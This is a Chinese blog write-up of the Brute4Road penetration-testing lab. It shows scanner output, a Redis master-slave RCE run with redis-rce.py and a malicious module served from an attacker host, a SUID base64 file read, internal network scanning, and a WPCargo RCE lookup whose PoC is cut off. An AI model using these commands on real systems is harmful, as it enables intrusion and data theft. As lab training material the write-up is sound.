@@ -1,0 +1,916 @@
+<!DOCTYPE html>
+<html lang="zh" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>春秋云镜-Brute4Road-Writeup | Xrntkk&#39;s Blog</title>
+<meta name="keywords" content="writeup, 渗透, 春秋云镜">
+<meta name="description" content="参考文章
+
+https://bowuchuling.github.io/posts/chunqiuBrute4Road.html
+https://h0ny.github.io/posts/Brute4Road-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83
+文章 - 浅谈约束委派攻击 - 先知社区
+FLAG1
+拿到靶机先用fscan扫一扫
+┌──────────────────────────────────────────────┐
+│    ___                              _        │
+│   / _ \     ___  ___ _ __ __ _  ___| | __    │
+│  / /_\/____/ __|/ __| &#39;__/ _` |/ __| |/ /    │
+│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │
+│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
+└──────────────────────────────────────────────┘
+      Fscan Version: 2.0.0
+
+[2025-03-17 14:12:55] [INFO] 暴力破解线程数: 1
+[2025-03-17 14:12:55] [INFO] 开始信息扫描
+[2025-03-17 14:12:55] [INFO] 最终有效主机数量: 1
+[2025-03-17 14:12:55] [INFO] 开始主机扫描
+[2025-03-17 14:12:55] [INFO] 有效端口数量: 233
+[2025-03-17 14:12:55] [SUCCESS] 端口开放 39.98.114.207:80
+[2025-03-17 14:12:55] [SUCCESS] 端口开放 39.98.114.207:22
+[2025-03-17 14:12:55] [SUCCESS] 端口开放 39.98.114.207:6379
+[2025-03-17 14:12:55] [SUCCESS] 端口开放 39.98.114.207:21
+[2025-03-17 14:12:55] [SUCCESS] 服务识别 39.98.114.207:22 =&gt; [ssh] 版本:7.4 产品:OpenSSH 信息:protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.4.]
+[2025-03-17 14:12:55] [SUCCESS] 服务识别 39.98.114.207:21 =&gt; [ftp] 版本:3.0.2 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.2).]
+[2025-03-17 14:13:00] [SUCCESS] 服务识别 39.98.114.207:80 =&gt; [http] 版本:1.20.1 产品:nginx
+[2025-03-17 14:13:00] [SUCCESS] 服务识别 39.98.114.207:6379 =&gt; [redis] 版本:5.0.12 产品:Redis key-value store
+[2025-03-17 14:13:06] [INFO] 存活端口数量: 4
+[2025-03-17 14:13:06] [INFO] 开始漏洞扫描
+[2025-03-17 14:13:06] [INFO] 加载的插件: ftp, redis, ssh, webpoc, webtitle
+[2025-03-17 14:13:06] [SUCCESS] 网站标题 http://39.98.114.207      状态码:200 长度:4833   标题:Welcome to CentOS
+[2025-03-17 14:13:07] [SUCCESS] 匿名登录成功!
+[2025-03-17 14:13:09] [SUCCESS] Redis 39.98.114.207:6379 发现未授权访问 文件位置:/usr/local/redis/db/dump.rdb
+[2025-03-17 14:13:13] [SUCCESS] Redis无密码连接成功: 39.98.114.207:6379
+[2025-03-17 14:13:18] [SUCCESS] 扫描已完成: 5/5
+发现redis不需要密码">
+<meta name="author" content="Xrntkk">
+<link rel="canonical" href="http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-brute4road-writeup/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.2b4603ab7eabc3642d3649f5b8728329d021f06eb40817493eab54c5172e9a52.css" integrity="sha256-K0YDq36rw2QtNkn1uHKDKdAh8G60CBdJPqtUxRcumlI=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="zh" href="http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-brute4road-writeup/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+<meta name="baidu-site-verification" content="codeva-snmPZ4WZk8" /><meta property="og:url" content="http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-brute4road-writeup/">
+  <meta property="og:site_name" content="Xrntkk&#39;s Blog">
+  <meta property="og:title" content="春秋云镜-Brute4Road-Writeup">
+  <meta property="og:description" content="参考文章
+https://bowuchuling.github.io/posts/chunqiuBrute4Road.html
+https://h0ny.github.io/posts/Brute4Road-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83
+文章 - 浅谈约束委派攻击 - 先知社区
+FLAG1 拿到靶机先用fscan扫一扫
+┌──────────────────────────────────────────────┐│ ___ _ ││ / _ \ ___ ___ _ __ __ _ ___| | __ ││ / /_\/____/ __|/ __| &#39;__/ _` |/ __| |/ / ││ / /_\\_____\__ \ (__| | | (_| | (__| &lt; ││ \____/ |___/\___|_| \__,_|\___|_|\_\ │└──────────────────────────────────────────────┘Fscan Version: 2.0.0[2025-03-17 14:12:55] [INFO] 暴力破解线程数: 1[2025-03-17 14:12:55] [INFO] 开始信息扫描[2025-03-17 14:12:55] [INFO] 最终有效主机数量: 1[2025-03-17 14:12:55] [INFO] 开始主机扫描[2025-03-17 14:12:55] [INFO] 有效端口数量: 233[2025-03-17 14:12:55] [SUCCESS] 端口开放 39.98.114.207:80[2025-03-17 14:12:55] [SUCCESS] 端口开放 39.98.114.207:22[2025-03-17 14:12:55] [SUCCESS] 端口开放 39.98.114.207:6379[2025-03-17 14:12:55] [SUCCESS] 端口开放 39.98.114.207:21[2025-03-17 14:12:55] [SUCCESS] 服务识别 39.98.114.207:22 =&gt; [ssh] 版本:7.4 产品:OpenSSH 信息:protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.4.][2025-03-17 14:12:55] [SUCCESS] 服务识别 39.98.114.207:21 =&gt; [ftp] 版本:3.0.2 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.2).][2025-03-17 14:13:00] [SUCCESS] 服务识别 39.98.114.207:80 =&gt; [http] 版本:1.20.1 产品:nginx[2025-03-17 14:13:00] [SUCCESS] 服务识别 39.98.114.207:6379 =&gt; [redis] 版本:5.0.12 产品:Redis key-value store[2025-03-17 14:13:06] [INFO] 存活端口数量: 4[2025-03-17 14:13:06] [INFO] 开始漏洞扫描[2025-03-17 14:13:06] [INFO] 加载的插件: ftp, redis, ssh, webpoc, webtitle[2025-03-17 14:13:06] [SUCCESS] 网站标题 http://39.98.114.207 状态码:200 长度:4833 标题:Welcome to CentOS[2025-03-17 14:13:07] [SUCCESS] 匿名登录成功![2025-03-17 14:13:09] [SUCCESS] Redis 39.98.114.207:6379 发现未授权访问 文件位置:/usr/local/redis/db/dump.rdb[2025-03-17 14:13:13] [SUCCESS] Redis无密码连接成功: 39.98.114.207:6379[2025-03-17 14:13:18] [SUCCESS] 扫描已完成: 5/5 发现redis不需要密码">
+  <meta property="og:locale" content="zh">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="post">
+    <meta property="article:published_time" content="2025-03-17T22:02:55+08:00">
+    <meta property="article:modified_time" content="2025-03-17T22:02:55+08:00">
+    <meta property="article:tag" content="Writeup">
+    <meta property="article:tag" content="渗透">
+    <meta property="article:tag" content="春秋云镜">
+      <meta property="og:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
+<meta name="twitter:title" content="春秋云镜-Brute4Road-Writeup">
+<meta name="twitter:description" content="参考文章
+
+https://bowuchuling.github.io/posts/chunqiuBrute4Road.html
+https://h0ny.github.io/posts/Brute4Road-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83
+文章 - 浅谈约束委派攻击 - 先知社区
+FLAG1
+拿到靶机先用fscan扫一扫
+┌──────────────────────────────────────────────┐
+│    ___                              _        │
+│   / _ \     ___  ___ _ __ __ _  ___| | __    │
+│  / /_\/____/ __|/ __| &#39;__/ _` |/ __| |/ /    │
+│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │
+│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
+└──────────────────────────────────────────────┘
+      Fscan Version: 2.0.0
+
+[2025-03-17 14:12:55] [INFO] 暴力破解线程数: 1
+[2025-03-17 14:12:55] [INFO] 开始信息扫描
+[2025-03-17 14:12:55] [INFO] 最终有效主机数量: 1
+[2025-03-17 14:12:55] [INFO] 开始主机扫描
+[2025-03-17 14:12:55] [INFO] 有效端口数量: 233
+[2025-03-17 14:12:55] [SUCCESS] 端口开放 39.98.114.207:80
+[2025-03-17 14:12:55] [SUCCESS] 端口开放 39.98.114.207:22
+[2025-03-17 14:12:55] [SUCCESS] 端口开放 39.98.114.207:6379
+[2025-03-17 14:12:55] [SUCCESS] 端口开放 39.98.114.207:21
+[2025-03-17 14:12:55] [SUCCESS] 服务识别 39.98.114.207:22 =&gt; [ssh] 版本:7.4 产品:OpenSSH 信息:protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.4.]
+[2025-03-17 14:12:55] [SUCCESS] 服务识别 39.98.114.207:21 =&gt; [ftp] 版本:3.0.2 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.2).]
+[2025-03-17 14:13:00] [SUCCESS] 服务识别 39.98.114.207:80 =&gt; [http] 版本:1.20.1 产品:nginx
+[2025-03-17 14:13:00] [SUCCESS] 服务识别 39.98.114.207:6379 =&gt; [redis] 版本:5.0.12 产品:Redis key-value store
+[2025-03-17 14:13:06] [INFO] 存活端口数量: 4
+[2025-03-17 14:13:06] [INFO] 开始漏洞扫描
+[2025-03-17 14:13:06] [INFO] 加载的插件: ftp, redis, ssh, webpoc, webtitle
+[2025-03-17 14:13:06] [SUCCESS] 网站标题 http://39.98.114.207      状态码:200 长度:4833   标题:Welcome to CentOS
+[2025-03-17 14:13:07] [SUCCESS] 匿名登录成功!
+[2025-03-17 14:13:09] [SUCCESS] Redis 39.98.114.207:6379 发现未授权访问 文件位置:/usr/local/redis/db/dump.rdb
+[2025-03-17 14:13:13] [SUCCESS] Redis无密码连接成功: 39.98.114.207:6379
+[2025-03-17 14:13:18] [SUCCESS] 扫描已完成: 5/5
+发现redis不需要密码">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "http://localhost:1313/post/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "春秋云镜-Brute4Road-Writeup",
+      "item": "http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-brute4road-writeup/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "春秋云镜-Brute4Road-Writeup",
+  "name": "春秋云镜-Brute4Road-Writeup",
+  "description": "参考文章\nhttps://bowuchuling.github.io/posts/chunqiuBrute4Road.html\nhttps://h0ny.github.io/posts/Brute4Road-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83\n文章 - 浅谈约束委派攻击 - 先知社区\nFLAG1 拿到靶机先用fscan扫一扫\n┌──────────────────────────────────────────────┐\r│ ___ _ │\r│ / _ \\ ___ ___ _ __ __ _ ___| | __ │\r│ / /_\\/____/ __|/ __| \u0026#39;__/ _` |/ __| |/ / │\r│ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u0026lt; │\r│ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │\r└──────────────────────────────────────────────┘\rFscan Version: 2.0.0\r[2025-03-17 14:12:55] [INFO] 暴力破解线程数: 1\r[2025-03-17 14:12:55] [INFO] 开始信息扫描\r[2025-03-17 14:12:55] [INFO] 最终有效主机数量: 1\r[2025-03-17 14:12:55] [INFO] 开始主机扫描\r[2025-03-17 14:12:55] [INFO] 有效端口数量: 233\r[2025-03-17 14:12:55] [SUCCESS] 端口开放 39.98.114.207:80\r[2025-03-17 14:12:55] [SUCCESS] 端口开放 39.98.114.207:22\r[2025-03-17 14:12:55] [SUCCESS] 端口开放 39.98.114.207:6379\r[2025-03-17 14:12:55] [SUCCESS] 端口开放 39.98.114.207:21\r[2025-03-17 14:12:55] [SUCCESS] 服务识别 39.98.114.207:22 =\u0026gt; [ssh] 版本:7.4 产品:OpenSSH 信息:protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.4.]\r[2025-03-17 14:12:55] [SUCCESS] 服务识别 39.98.114.207:21 =\u0026gt; [ftp] 版本:3.0.2 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.2).]\r[2025-03-17 14:13:00] [SUCCESS] 服务识别 39.98.114.207:80 =\u0026gt; [http] 版本:1.20.1 产品:nginx\r[2025-03-17 14:13:00] [SUCCESS] 服务识别 39.98.114.207:6379 =\u0026gt; [redis] 版本:5.0.12 产品:Redis key-value store\r[2025-03-17 14:13:06] [INFO] 存活端口数量: 4\r[2025-03-17 14:13:06] [INFO] 开始漏洞扫描\r[2025-03-17 14:13:06] [INFO] 加载的插件: ftp, redis, ssh, webpoc, webtitle\r[2025-03-17 14:13:06] [SUCCESS] 网站标题 http://39.98.114.207 状态码:200 长度:4833 标题:Welcome to CentOS\r[2025-03-17 14:13:07] [SUCCESS] 匿名登录成功!\r[2025-03-17 14:13:09] [SUCCESS] Redis 39.98.114.207:6379 发现未授权访问 文件位置:/usr/local/redis/db/dump.rdb\r[2025-03-17 14:13:13] [SUCCESS] Redis无密码连接成功: 39.98.114.207:6379\r[2025-03-17 14:13:18] [SUCCESS] 扫描已完成: 5/5 发现redis不需要密码\n",
+  "keywords": [
+    "writeup", "渗透", "春秋云镜"
+  ],
+  "articleBody": "参考文章\nhttps://bowuchuling.github.io/posts/chunqiuBrute4Road.html\nhttps://h0ny.github.io/posts/Brute4Road-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83\n文章 - 浅谈约束委派攻击 - 先知社区\nFLAG1 拿到靶机先用fscan扫一扫\n┌──────────────────────────────────────────────┐\r│ ___ _ │\r│ / _ \\ ___ ___ _ __ __ _ ___| | __ │\r│ / /_\\/____/ __|/ __| '__/ _` |/ __| |/ / │\r│ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u003c │\r│ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │\r└──────────────────────────────────────────────┘\rFscan Version: 2.0.0\r[2025-03-17 14:12:55] [INFO] 暴力破解线程数: 1\r[2025-03-17 14:12:55] [INFO] 开始信息扫描\r[2025-03-17 14:12:55] [INFO] 最终有效主机数量: 1\r[2025-03-17 14:12:55] [INFO] 开始主机扫描\r[2025-03-17 14:12:55] [INFO] 有效端口数量: 233\r[2025-03-17 14:12:55] [SUCCESS] 端口开放 39.98.114.207:80\r[2025-03-17 14:12:55] [SUCCESS] 端口开放 39.98.114.207:22\r[2025-03-17 14:12:55] [SUCCESS] 端口开放 39.98.114.207:6379\r[2025-03-17 14:12:55] [SUCCESS] 端口开放 39.98.114.207:21\r[2025-03-17 14:12:55] [SUCCESS] 服务识别 39.98.114.207:22 =\u003e [ssh] 版本:7.4 产品:OpenSSH 信息:protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.4.]\r[2025-03-17 14:12:55] [SUCCESS] 服务识别 39.98.114.207:21 =\u003e [ftp] 版本:3.0.2 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.2).]\r[2025-03-17 14:13:00] [SUCCESS] 服务识别 39.98.114.207:80 =\u003e [http] 版本:1.20.1 产品:nginx\r[2025-03-17 14:13:00] [SUCCESS] 服务识别 39.98.114.207:6379 =\u003e [redis] 版本:5.0.12 产品:Redis key-value store\r[2025-03-17 14:13:06] [INFO] 存活端口数量: 4\r[2025-03-17 14:13:06] [INFO] 开始漏洞扫描\r[2025-03-17 14:13:06] [INFO] 加载的插件: ftp, redis, ssh, webpoc, webtitle\r[2025-03-17 14:13:06] [SUCCESS] 网站标题 http://39.98.114.207 状态码:200 长度:4833 标题:Welcome to CentOS\r[2025-03-17 14:13:07] [SUCCESS] 匿名登录成功!\r[2025-03-17 14:13:09] [SUCCESS] Redis 39.98.114.207:6379 发现未授权访问 文件位置:/usr/local/redis/db/dump.rdb\r[2025-03-17 14:13:13] [SUCCESS] Redis无密码连接成功: 39.98.114.207:6379\r[2025-03-17 14:13:18] [SUCCESS] 扫描已完成: 5/5 发现redis不需要密码\n那我们连上去\nredis未授权拿shell的常见利用方法有写webshell，写corn或者写sshkey\n这里我先尝试了写corn\n发现没权限\n那同样的也没办法写sshkey\n看到redis版本为5.0.12\n可以打redis主从复制（4.x~5.0.5）\nRedis主从复制getshell技巧 - Bypass - 博客园\n生成恶意so文件\ngit clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand\rcd RedisModules-ExecuteCommand/\rmake 自动化攻击脚本\ngit clone https://github.com/Ridter/redis-rce.git\rcd redis-rce/\rcp ../RedisModules-ExecuteCommand/src/module.so ./\rpip install -r requirements.txt python redis-rce.py -r 192.168.28.152 -p 6379 -L 192.168.28.137 -f module.so\r//python redis-rce.py -r 目标ip-p 目标端口 -L 本地ip -f 恶意.so 拿到shell之后先上个线\n/home/redis/flag/flag01 读flag发现没有权限\n尝试suid提权\n1[redis@centos-web01 tmp]$ find / -perm -u=s -type f 2\u003e/dev/null 2/usr/sbin/pam_timestamp_check 3/usr/sbin/usernetctl 4/usr/sbin/unix_chkpwd 5/usr/bin/at 6/usr/bin/chfn 7/usr/bin/gpasswd 8/usr/bin/passwd 9/usr/bin/chage 10/usr/bin/base64 11/usr/bin/umount 12/usr/bin/su 13/usr/bin/chsh 14/usr/bin/sudo 15/usr/bin/crontab 16/usr/bin/newgrp 17/usr/bin/mount 18/usr/bin/pkexec 19/usr/libexec/dbus-1/dbus-daemon-launch-helper 20/usr/lib/polkit-1/polkit-agent-helper-1 base64可以提权，但是只能读文件\nbase64 \"/home/redis/flag/flag01\" | base64 --decode [redis@centos-web01 tmp]$ base64 \"/home/redis/flag/flag01\" | base64 --decode\r██████ ██ ██ ███████ ██\r░█░░░░██ ░██ █░█ ░██░░░░██ ░██\r░█ ░██ ██████ ██ ██ ██████ █████ █ ░█ ░██ ░██ ██████ ██████ ░██\r░██████ ░░██░░█░██ ░██░░░██░ ██░░░██ ██████░███████ ██░░░░██ ░░░░░░██ ██████\r░█░░░░ ██ ░██ ░ ░██ ░██ ░██ ░███████░░░░░█ ░██░░░██ ░██ ░██ ███████ ██░░░██\r░█ ░██ ░██ ░██ ░██ ░██ ░██░░░░ ░█ ░██ ░░██ ░██ ░██ ██░░░░██ ░██ ░██\r░███████ ░███ ░░██████ ░░██ ░░██████ ░█ ░██ ░░██░░██████ ░░████████░░██████\r░░░░░░░ ░░░ ░░░░░░ ░░ ░░░░░░ ░ ░░ ░░ ░░░░░░ ░░░░░░░░ ░░░░░░ flag01: flag{b16a2a4f-87b9-404c-8989-3ac8eac58ae2}\rCongratulations! ! !\rGuess where is the second flag? 拿到第一个flag\nFLAG2 信息收集一下\n看一下ip\n1[redis@centos-web01 tmp]$ ip addr show 21: lo: mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 3 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 4 inet 127.0.0.1/8 scope host lo 5 valid_lft forever preferred_lft forever 6 inet6 ::1/128 scope host 7 valid_lft forever preferred_lft forever 82: eth0: mtu 1500 qdisc mq state UP group default qlen 1000 9 link/ether 00:16:3e:1a:f1:ec brd ff:ff:ff:ff:ff:ff 10 inet 172.22.2.7/16 brd 172.22.255.255 scope global dynamic eth0 11 valid_lft 315356573sec preferred_lft 315356573sec 12 inet6 fe80::216:3eff:fe1a:f1ec/64 scope link 13 valid_lft forever preferred_lft forever fscan扫一下\n1[redis@centos-web01 tmp]$ ./fscan -h 172.22.2.7/24 -nobr 2┌──────────────────────────────────────────────┐ 3│ ___ _ │ 4│ / _ \\ ___ ___ _ __ __ _ ___| | __ │ 5│ / /_\\/____/ __|/ __| '__/ _` |/ __| |/ / │ 6│ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u003c │ 7│ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │ 8└──────────────────────────────────────────────┘ 9 Fscan Version: 2.0.0 10 11[2025-03-17 20:10:58] [INFO] 暴力破解线程数: 1 12[2025-03-17 20:10:58] [INFO] 开始信息扫描 13[2025-03-17 20:10:58] [INFO] CIDR范围: 172.22.2.0-172.22.2.255 14[2025-03-17 20:10:58] [INFO] 生成IP范围: 172.22.2.0.%!d(string=172.22.2.255) - %!s(MISSING).%!d(MISSING) 15[2025-03-17 20:10:58] [INFO] 解析CIDR 172.22.2.7/24 -\u003e IP范围 172.22.2.0-172.22.2.255 16[2025-03-17 20:10:58] [INFO] 最终有效主机数量: 256 17[2025-03-17 20:10:58] [INFO] 开始主机扫描 18[2025-03-17 20:10:58] [INFO] 正在尝试无监听ICMP探测... 19[2025-03-17 20:10:58] [INFO] 当前用户权限不足,无法发送ICMP包 20[2025-03-17 20:10:58] [INFO] 切换为PING方式探测... 21[2025-03-17 20:10:58] [SUCCESS] 目标 172.22.2.3 存活 (ICMP) 22[2025-03-17 20:10:58] [SUCCESS] 目标 172.22.2.7 存活 (ICMP) 23[2025-03-17 20:10:58] [SUCCESS] 目标 172.22.2.16 存活 (ICMP) 24[2025-03-17 20:10:59] [SUCCESS] 目标 172.22.2.18 存活 (ICMP) 25[2025-03-17 20:10:59] [SUCCESS] 目标 172.22.2.34 存活 (ICMP) 26[2025-03-17 20:11:04] [INFO] 存活主机数量: 5 27[2025-03-17 20:11:05] [INFO] 有效端口数量: 233 28[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.7:80 29[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.18:22 30[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.7:22 31[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.7:21 32[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.3:445 33[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.3:389 34[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.34:139 35[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.18:139 36[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.34:135 37[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.16:139 38[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.3:139 39[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.16:135 40[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.3:135 41[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.34:445 42[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.16:445 43[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.16:80 44[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.18:80 45[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.3:88 46[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.18:445 47[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.16:1433 48[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.7:6379 49[2025-03-17 20:11:05] [SUCCESS] 服务识别 172.22.2.18:22 =\u003e [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.] 50[2025-03-17 20:11:05] [SUCCESS] 服务识别 172.22.2.7:22 =\u003e [ssh] 版本:7.4 产品:OpenSSH 信息:protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.4.] 51[2025-03-17 20:11:05] [SUCCESS] 服务识别 172.22.2.7:21 =\u003e [ftp] 版本:3.0.2 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.2).] 52[2025-03-17 20:11:10] [SUCCESS] 服务识别 172.22.2.7:80 =\u003e [http] 版本:1.20.1 产品:nginx 53[2025-03-17 20:11:10] [SUCCESS] 服务识别 172.22.2.3:445 =\u003e 54[2025-03-17 20:11:10] [SUCCESS] 服务识别 172.22.2.3:389 =\u003e [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name 55[2025-03-17 20:11:10] [SUCCESS] 服务识别 172.22.2.34:139 =\u003e Banner:[.] 56[2025-03-17 20:11:10] [SUCCESS] 服务识别 172.22.2.16:139 =\u003e Banner:[.] 57[2025-03-17 20:11:10] [SUCCESS] 服务识别 172.22.2.3:139 =\u003e Banner:[.] 58[2025-03-17 20:11:10] [SUCCESS] 服务识别 172.22.2.34:445 =\u003e 59[2025-03-17 20:11:10] [SUCCESS] 服务识别 172.22.2.16:445 =\u003e 60[2025-03-17 20:11:10] [SUCCESS] 服务识别 172.22.2.16:80 =\u003e [http] 版本:2.0 产品:Microsoft HTTPAPI httpd 系统:Windows 61[2025-03-17 20:11:10] [SUCCESS] 服务识别 172.22.2.3:88 =\u003e 62[2025-03-17 20:11:11] [SUCCESS] 服务识别 172.22.2.16:1433 =\u003e [ms-sql-s] 版本:13.00.4001; SP1 产品:Microsoft SQL Server 2016 系统:Windows Banner:[.%.] 63[2025-03-17 20:11:11] [SUCCESS] 服务识别 172.22.2.7:6379 =\u003e [redis] 版本:5.0.12 产品:Redis key-value store 64[2025-03-17 20:11:11] [SUCCESS] 服务识别 172.22.2.18:80 =\u003e [http] 65[2025-03-17 20:12:05] [SUCCESS] 服务识别 172.22.2.18:139 =\u003e 66[2025-03-17 20:12:06] [SUCCESS] 服务识别 172.22.2.18:445 =\u003e 67[2025-03-17 20:12:10] [SUCCESS] 服务识别 172.22.2.34:135 =\u003e 68[2025-03-17 20:12:10] [SUCCESS] 服务识别 172.22.2.16:135 =\u003e 69[2025-03-17 20:12:10] [SUCCESS] 服务识别 172.22.2.3:135 =\u003e 70[2025-03-17 20:12:10] [INFO] 存活端口数量: 21 71[2025-03-17 20:12:10] [INFO] 开始漏洞扫描 72[2025-03-17 20:12:10] [INFO] 加载的插件: findnet, ftp, ldap, ms17010, mssql, netbios, redis, smb, smb2, smbghost, ssh, webpoc, webtitle 73[2025-03-17 20:12:10] [SUCCESS] NetInfo 扫描结果 74目标主机: 172.22.2.3 75主机名: DC 76发现的网络接口: 77 IPv4地址: 78 └─ 172.22.2.3 79[2025-03-17 20:12:10] [SUCCESS] 网站标题 http://172.22.2.16 状态码:404 长度:315 标题:Not Found 80[2025-03-17 20:12:10] [SUCCESS] NetBios 172.22.2.34 XIAORANG\\CLIENT01 81[2025-03-17 20:12:10] [SUCCESS] 网站标题 http://172.22.2.7 状态码:200 长度:4833 标题:Welcome to CentOS 82[2025-03-17 20:12:10] [SUCCESS] NetBios 172.22.2.16 MSSQLSERVER.xiaorang.lab Windows Server 2016 Datacenter 14393 83[2025-03-17 20:12:10] [SUCCESS] NetBios 172.22.2.3 DC:DC.xiaorang.lab Windows Server 2016 Datacenter 14393 84[2025-03-17 20:12:10] [SUCCESS] NetInfo 扫描结果 85目标主机: 172.22.2.16 86主机名: MSSQLSERVER 87发现的网络接口: 88 IPv4地址: 89 └─ 172.22.2.16 90[2025-03-17 20:12:10] [SUCCESS] NetInfo 扫描结果 91目标主机: 172.22.2.34 92主机名: CLIENT01 93发现的网络接口: 94 IPv4地址: 95 └─ 172.22.2.34 96[2025-03-17 20:12:10] [SUCCESS] NetBios 172.22.2.18 WORKGROUP\\UBUNTU-WEB02 97[2025-03-17 20:12:11] [SUCCESS] 网站标题 http://172.22.2.18 状态码:200 长度:57738 标题:又一个WordPress站点 98[2025-03-17 20:12:13] [SUCCESS] Redis 172.22.2.7:6379 发现未授权访问 文件位置:/usr/local/redis/db/module.so 99[2025-03-17 20:12:17] [SUCCESS] Redis无密码连接成功: 172.22.2.7:6379 100[2025-03-17 20:12:18] [SUCCESS] 扫描已完成: 37/37 扫出来四台机子\nNetBios 172.22.2.34 XIAORANG\\CLIENT01\rNetBios 172.22.2.16 MSSQLSERVER.xiaorang.lab\rNetBios 172.22.2.3 DC:DC.xiaorang.lab\rNetBios 172.22.2.18 WORKGROUP\\UBUNTU-WEB02 WordPress 172.22.2.18上有一个wordpress服务，看看能不能从这里入手\n拿wpscan扫一下\nproxychains4 wpscan --url 172.22.2.18 --api-token my_token 扫出来一堆洞\n有个能够rce的，感觉比较好利用\n1 2 | [!] Title: WPCargo \u003c 6.9.0 - Unauthenticated RCE 3 | Fixed in: 6.9.0 4 | References: 5 | - https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a 6 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25003 找一下漏洞的poc\nWPCargo \u003c 6.9.0 – Unauthenticated RCE | CVE 2021-25003 | Plugin Vulnerabilities\npoc\n1import sys 2import binascii 